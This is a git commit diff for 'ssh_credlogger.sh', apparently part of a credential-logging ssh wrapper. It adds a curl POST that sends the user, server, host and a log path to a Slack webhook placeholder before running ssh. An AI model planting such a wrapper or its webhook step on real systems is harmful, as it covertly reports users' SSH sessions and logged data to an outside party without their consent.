a36a781920cd678bad39c03acf13c73477399d66
kvcallfield <52758926+kvcallfield@users.noreply.github.com>
2021-12-01 12:59:39 -0600

    Update ssh_credlogger.sh

--- ssh_credlogger.sh
+++ ssh_credlogger.sh
@@ -1,3 +1,6 @@
 #!/bin/sh
 
-ssh $@
+# comment the next line out if you're not doing a Slack webhook
+curl -X POST https://hooks.slack.com/workflows/your_webhook_here -d "{\"user\": \"$1\", \"server\": \"$2\", \"host\": \"$3\", \"logpath\": \"$4\"}"
+
+ssh $5 $6 $7
